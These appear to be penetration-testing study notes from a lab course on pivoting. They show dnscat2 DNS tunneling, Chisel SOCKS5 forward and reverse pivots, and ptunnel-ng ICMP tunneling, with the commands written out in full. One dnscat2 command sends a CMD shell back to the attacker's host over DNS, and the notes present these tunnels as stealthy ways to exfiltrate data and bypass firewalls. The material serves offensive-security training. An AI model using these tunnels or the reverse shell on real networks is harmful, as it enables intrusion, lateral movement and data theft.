# DNS Tunneling with Dnscat2
- [Dnscat2](https://github.com/iagox86/dnscat2) is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted `Command-&-Control` (`C&C` or `C2`) channel and sends data inside TXT records within the DNS protocol. 
- Usually, every active directory domain environment in a corporate network will have its own DNS server, which will resolve hostnames to IP addresses and route the traffic to external DNS servers participating in the overarching DNS system. 
- However, with dnscat2, the address resolution is requested from an external server. When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request. Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic. For our testing example, we can use dnscat2 server on our attack host, and execute the dnscat2 client on another Windows host.
#### Starting the dnscat2 server
```shell-session
[!bash!]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```
- After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server. 
- We can use the client with the dnscat2 project or use [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell), a dnscat2 compatible PowerShell-based client that we can run from Windows targets to establish a tunnel with our dnscat2 server. We can clone the project containing the client file to our attack host, then transfer it to the target.
- Once the `dnscat2.ps1` file is on the target we can import it and run associated cmd-lets.
#### Importing dnscat2.ps1
```powershell-session
PS C:\htb> Import-Module .\dnscat2.ps1
```
- After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.

```powershell-session
PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```
- We must use the pre-shared secret (`-PreSharedSecret`) generated on the server to ensure our session is established and encrypted. If all steps are completed successfully, we will see a session established with our server.

# SOCKS5 Tunneling with Chisel
- [Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in [Go](https://go.dev/) that uses HTTP to transport data that is secured using SSH.
- `Chisel` can create a client-server tunnel connection in a firewall restricted environment.
- Let us consider a scenario where we have to tunnel our traffic to a webserver on the `172.16.5.0`/`23` network (internal network). We have the Domain Controller with the address `172.16.5.19`. This is not directly accessible to our attack host since our attack host and the domain controller belong to different network segments. However, since we have compromised the Ubuntu server, we can start a Chisel server on it that will listen on a specific port and forward our traffic to the internal network through the established tunnel.
#### Transferring Chisel Binary to Pivot Host
```shell-session
AnuragTaparia@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/
```
- Then we can start the Chisel server/listener.
#### Running the Chisel Server on the Pivot Host
```shell-session
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
```
- The Chisel listener will listen for incoming connections on port `1234` using SOCKS5 (`--socks5`) and forward it to all the networks that are accessible from the pivot host. In our case, the pivot host has an interface on the 172.16.5.0/23 network, which will allow us to reach hosts on that network.
- We can start a client on our attack host and connect to the Chisel server.
#### Connecting to the Chisel Server
```shell-session
AnuragTaparia@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks
```
#### Editing & Confirming proxychains.conf
![[proxychains for chisel.png]]
- Now if we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.
#### Pivoting to the DC
```shell-session
AnuragTaparia@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

## Chisel Reverse Pivot
- In the previous example, we used the compromised machine (Ubuntu) as our Chisel server, listing on port 1234. Still, there may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.
- When the Chisel server has `--reverse` enabled, remotes can be prefixed with `R` to denote reversed. The server will listen and accept connections, and they will be proxied through the client, which specified the remote. Reverse remotes specifying `R:socks` will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy.
#### Starting the Chisel Server on our Attack Host
```shell-session
AnuragTaparia@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5
```
- /Then we connect from the Ubuntu (pivot host) to our attack host, using the option `R:socks`
#### Connecting the Chisel Client to our Attack Host
```shell-session
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
```
- We can use any editor we would like to edit the proxychains.conf file, then confirm our configuration changes using `tail`.
![[proxychains for reverse chisel.png]]
- If we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.
```shell-session
AnuragTaparia@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

# ICMP Tunneling with SOCKS
- ICMP tunneling encapsulates your traffic within `ICMP packets` containing `echo requests` and `responses`. 
- ICMP tunneling would only work when ping responses are permitted within a firewalled network. 
- When a host within a firewalled network is allowed to ping an external server, it can encapsulate its traffic within the ping echo request and send it to an external server. The external server can validate this traffic and send an appropriate response, which is extremely useful for data exfiltration and creating pivot tunnels to an external server.
- We will use the [ptunnel-ng](https://github.com/utoni/ptunnel-ng) tool to create a tunnel between our Ubuntu server and our attack host. Once a tunnel is created, we will be able to proxy our traffic through the `ptunnel-ng client`. We can start the `ptunnel-ng server` on the target pivot host. Let's start by setting up ptunnel-ng.
#### Building Ptunnel-ng with Autogen.sh
```shell-session
AnuragTaparia@htb[/htb]$ sudo apt install automake autoconf -y
AnuragTaparia@htb[/htb]$ cd ptunnel-ng/
AnuragTaparia@htb[/htb]$ sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
AnuragTaparia@htb[/htb]$ ./autogen.sh
```
#### Transferring Ptunnel-ng to the Pivot Host
```shell-session
AnuragTaparia@htb[/htb]$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```
- With ptunnel-ng on the target host, we can start the server-side of the ICMP tunnel using the command directly below.
#### Starting the ptunnel-ng Server on the Target Host
```shell-session
ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22
```

- The IP address following `-r` should be the IP we want ptunnel-ng to accept connections on. In this case, whatever IP is reachable from our attack host would be what we would use. We would benefit from using this same thinking & consideration during an actual engagement.
- Back on the attack host, we can attempt to connect to the ptunnel-ng server (`-p <ipAddressofTarget>`) but ensure this happens through local port 2222 (`-l2222`). Connecting through local port 2222 allows us to send traffic through the ICMP tunnel.
#### Connecting to ptunnel-ng Server from Attack Host
```shell-session
AnuragTaparia@htb[/htb]$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

- With the ptunnel-ng ICMP tunnel successfully established, we can attempt to connect to the target using SSH through local port 2222 (`-p2222`).
#### Tunneling an SSH connection through an ICMP Tunnel
```shell-session
AnuragTaparia@htb[/htb]$ ssh -p2222 -lubuntu 127.0.0.1
```
- If configured correctly, we will be able to enter credentials and have an SSH session all through the ICMP tunnel.
#### Enabling Dynamic Port Forwarding over SSH
- We may also use this tunnel and SSH to perform dynamic port forwarding to allow us to use proxychains in various ways.
```shell-session
AnuragTaparia@htb[/htb]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```
- We could use proxychains with Nmap to scan targets on the internal network (172.16.5.x). Based on our discoveries, we can attempt to connect to the target.
#### Proxychaining through the ICMP Tunnel
```shell-session
AnuragTaparia@htb[/htb]$ proxychains nmap -sV -sT 172.16.5.19 -p3389
```
